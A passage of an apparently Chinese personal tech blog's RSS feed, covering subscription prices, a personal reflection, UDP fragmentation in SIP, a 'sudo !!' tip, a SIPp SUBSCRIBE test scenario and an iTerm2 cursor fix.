          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 标准 8.17/月&lt;!-- raw HTML omitted --&gt;- 高级 12.33/月&lt;!-- raw HTML omitted --&gt;- 专业 16.50/月&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 标准 98&lt;!-- raw HTML omitted --&gt;- 高级 148&lt;!-- raw HTML omitted --&gt;- 专业 198&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;b站大会员&lt;/td&gt;
          &lt;td&gt;连续包年 6.3折 148/年&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 148&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;爱奇艺&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 黄金VIP会员 首年138/年，次年续费218&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 138&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;网易云音乐&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 连续包年 99&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;- 99&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;drawio-是什么&#34;&gt;draw.io 是什么&lt;/h1&gt;
&lt;p&gt;draw.io的功能涵盖了processon的很多功能，但是其最大的卖点是**免费。（**圈住，要考！）&lt;/p&gt;</description>
    </item>
    <item>
      <title>人为什么活着</title>
      <link>https://wdd.js.org/posts/2021/04/qb6asq/</link>
      <pubDate>Thu, 08 Apr 2021 21:05:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/qb6asq/</guid>
      <description>&lt;p&gt;最近几个月，一直有些不顺心的事情让我烦恼。&lt;/p&gt;
&lt;p&gt;下了扶梯，走在站台上往火车上，往二号车厢走去。同行的陌生人行色匆匆，无一逗留。&lt;/p&gt;
&lt;p&gt;动车的车头上，不知道是碰到了什么东西，染了一大片黄色的污渍，仿佛是撞到不知名的动物而留下的痕迹。车灯宛如一个大号的三角眼，直勾勾的往前望着，不知道在再想些什么。&lt;/p&gt;
&lt;p&gt;突然我的脑子里迸射出一个问题: 人为什么活着？&lt;/p&gt;
&lt;p&gt;记得以前课本上说，人和动物的区别是人会使用工具。但是我想在觉得，人和动物的区别应该是，人会问自己: 我什么活着。而动物凭本能行动，似乎并不会考虑活着这么深奥的问题。&lt;/p&gt;
&lt;p&gt;一只蚂蚁在一根绳爬，只有两个方向，要么前进，要么后退。有个蚂蚁似乎发现了第三个方向，就是可以绕着绳子转圈圈。而会转圈圈的蚂蚁，似乎就是那个容易烦恼的蚂蚁。&lt;/p&gt;
&lt;p&gt;这是我第一次考虑人为什么活着这个问题。回首过去，我觉得自己是个动物，凭借本能生活，饿了就吃，累了就睡。&lt;/p&gt;
&lt;p&gt;感觉每一天都是一个周期函数，永不停止的重复上下波动。&lt;/p&gt;
&lt;p&gt;最近刚好对声纹识别有些兴趣，在这个领域，有个技术叫做傅里叶变换。就是把一个时域的信号转换成频域的信号。实际的物理作用并没有变化，只是看待事物的角度发生变化，而看到的东西却不一样了。&lt;/p&gt;
&lt;p&gt;我觉得我也需要对我的生活做个傅里叶变换，找到一些能解决我困惑的答案。&lt;/p&gt;</description>
    </item>
    <item>
      <title>UDP分片导致SIP消息丢失</title>
      <link>https://wdd.js.org/opensips/ch7/big-udp-msg/</link>
      <pubDate>Thu, 08 Apr 2021 14:33:49 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/big-udp-msg/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/big-udp-msg/2022-12-02-14-03-20.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;现象&#34;&gt;现象&lt;/h1&gt;
&lt;p&gt;有了开源的框架，我们可以很方便的运行一个VOIP系统。但是维护一个VOIP系统并非那么简单。特别是如果经常出现一些偶发的问题，需要用经验丰富的运维人员来从不同层面分析。&lt;/p&gt;
&lt;p&gt;其中UDP分片，也可能是原因之一。&lt;/p&gt;
&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;以太网的最大MTU一般是1500字节，减去20字节的IP首部，8字节的UDP首部，UDP能承载的数据最大是1472字节。&lt;/p&gt;
&lt;p&gt;如果一个SIP消息的报文超过1472就会分片。（实际上，如果网络的MTU比1500更小，那么达到分片的尺寸也会变小）&lt;/p&gt;
&lt;p&gt;如下图，发送方通过以太网发送了4个报文，ABCD。其中D报文太了，而被分割成了三个报文。在传输过程中，D的一个分片丢失，接收方由于无法重新组装D报文，所以就将D报文的所有分片都丢弃。&lt;/p&gt;
&lt;p&gt;这将会导致一下问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;发送方因接收不到响应，所以产生了重传&lt;/li&gt;
&lt;li&gt;丢弃的分片导致其他的分片浪费了带宽&lt;/li&gt;
&lt;li&gt;IP分片是对发送者来说是简单的，但是对于接收者来说，分片的组装将会占用更多的资源
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/big-udp-msg/2022-12-02-14-03-34.png&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;RFC 3261中给出建议，某些情况下可以使用TCP来传输。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当MTU是未知的情况下，如果消息超过1300字节，则选择使用TCP传输&lt;/li&gt;
&lt;li&gt;当MTU是已知情况下，SIP的消息的大小如果大于MTU-200, 则需要使用TCP传输。留下200字节的余量，是因为SIP消息的响应可能大于SIP消息的请求，为了避免响应消息超过MTU，所以要留下200字节的余量。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;If a request is within 200 bytes of the path MTU, or if it is larger
  than 1300 bytes and the path MTU is unknown, the request MUST be sent&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;  using an RFC 2914 [43] congestion controlled transport protocol, such&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;  as TCP. If this causes a change in the transport protocol from the&lt;/p&gt;</description>
    </item>
    <item>
      <title>sudo !!的妙用</title>
      <link>https://wdd.js.org/posts/2021/04/nqs50g/</link>
      <pubDate>Thu, 08 Apr 2021 13:27:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/nqs50g/</guid>
      <description>&lt;p&gt;在ubuntu上执行命令，经常会出现下面的报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump: eno1: You don&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have permission to capture on that device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;socket: Operation not permitted&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种报错一般是执行命令时，没有加上sudo&lt;/p&gt;
&lt;p&gt;快速的解决方案是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;按向上箭头键&lt;/li&gt;
&lt;li&gt;ctrl+a 贯标定位到行首&lt;/li&gt;
&lt;li&gt;输入sudo&lt;/li&gt;
&lt;li&gt;按回车&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;上面的步骤是比较快的补救方案，但是因为向上的箭头一般布局在键盘的右下角，不移动手掌就够不着。一般输入向上的箭头时，右手会离开键盘的本位，会低头看下键盘，找下向上的箭头的位置。&lt;/p&gt;
&lt;p&gt;有没有右手不离开键盘本位，不需要低头看键盘的解决方案呢？&lt;/p&gt;
&lt;p&gt;答案就是： &lt;code&gt;sudo !!&lt;/code&gt;  !!会被解释成为上一条执行的命令。sudo !!就会变成使用sudo执行上一条命令。&lt;/p&gt;
&lt;p&gt;快试试看吧 sudo bang bang&lt;/p&gt;</description>
    </item>
    <item>
      <title>subscribe场景测试</title>
      <link>https://wdd.js.org/opensips/tools/sipp-subscriber/</link>
      <pubDate>Thu, 08 Apr 2021 12:32:49 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/sipp-subscriber/</guid>
      <description>&lt;h1 id=&#34;时序图&#34;&gt;时序图&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/sipp-subscriber/2022-12-02-17-17-34.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;场景解释&#34;&gt;场景解释&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;step1: SUBSCRIBE 客户端想要订阅某个分机的状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;step2: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; Ok 服务端接受了这个订阅消息
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;step3: NOTIFY 服务端向客户端返回他的订阅目标的状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;step4: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; Ok 客户端返回表示接受
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;场景文件&#34;&gt;场景文件&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iso-8859-2&amp;#34;&lt;/span&gt; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE scenario SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipp.dtd&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;scenario name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;subscibe wait notify&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;send retrans&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;!&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;CDATA&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SUBSCRIBE sip:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_monitor&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;@&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_domain&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Via: SIP/2.0/&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;transport&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;local_ip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;local_port&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;branch&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;branch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    From: sipp &amp;lt;sip:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_ext&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;@&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_domain&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;call_number&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    To: &amp;lt;sip:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_monitor&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;@&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_domain&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;remote_port&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Call-ID: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;call_id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CSeq: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;cseq&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; SUBSCRIBE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Contact: sip:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;my_ext&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;@&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;local_ip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;local_port&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Event: dialog
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Expires: &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User-Agent: SIPp/Win32
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Accept: application/dialog-info+xml, multipart/related, application/rlmi+xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/send&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;recv response&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt; rtd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/recv&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;recv request&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOTIFY&amp;#34;&lt;/span&gt; crlf&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt; rrs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/recv&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;send&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;!&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;CDATA&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      SIP/2.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;last_Via:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;last_From:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;last_To:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;last_Call-ID:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;last_CSeq:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/send&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;!--
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;nop&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;action&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &amp;lt;exec int_cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stop_now&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;/action&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/nop&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;!-- definition of the response time repartition table &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unit is ms&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;ResponseTimeRepartition value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10, 20, 30, 40, 50, 100, 150, 200&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;!-- definition of the call length repartition table &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unit is ms&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;     --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;CallLengthRepartition value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10, 50, 100, 500, 1000, 5000, 10000&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/scenario&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;定义配置文件&#34;&gt;定义配置文件&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# conf.sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;edge_address&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.40.88:18627&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;my_ext&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8003&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;my_domain&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ss.cc&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;my_monitor&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8004&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;定义状态码处理函数&#34;&gt;定义状态码处理函数&lt;/h1&gt;
&lt;p&gt;用来处理来自sipp的返回的状态码&lt;/p&gt;</description>
    </item>
    <item>
      <title>iterm2 光标消失了</title>
      <link>https://wdd.js.org/posts/2021/04/hh661g/</link>
      <pubDate>Fri, 02 Apr 2021 21:09:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/hh661g/</guid>
      <description>&lt;p&gt;终端用着用着，光标消失了。&lt;/p&gt;
&lt;p&gt;iterm2 仓库issues给出提示，要在设置》高级里面，Use system cursor icons when possile 为 yes.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/04/hh661g/2022-10-29-19-56-39.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然而上面的设置并没有用。&lt;/p&gt;
&lt;p&gt;然后看了superuser上的question, 给出提示, 直接在终端输入 &lt;code&gt;reset&lt;/code&gt; , 光标就会出现。解决了问题。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reset
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://gitlab.com/gnachman/iterm2/-/issues/6623&#34;&gt;https://gitlab.com/gnachman/iterm2/-/issues/6623&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://superuser.com/questions/177377/os-x-terminal-cursor-problem&#34;&gt;https://superuser.com/questions/177377/os-x-terminal-cursor-problem&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>matplotlib图片弹窗没有弹出</title>
      <link>https://wdd.js.org/posts/2021/03/pqreg4/</link>
